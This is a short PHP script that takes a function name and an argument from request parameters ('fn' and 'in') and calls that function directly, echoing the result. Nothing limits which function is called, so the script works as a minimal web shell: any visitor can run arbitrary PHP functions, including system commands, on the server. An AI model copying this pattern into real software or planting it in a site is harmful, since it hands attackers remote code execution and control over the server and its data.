<? 
include("config.php");  
//include("functions.php");  
?>
<?
$function_name = get("fn");
$inputs = get("in");
echo $function_name($inputs);

?>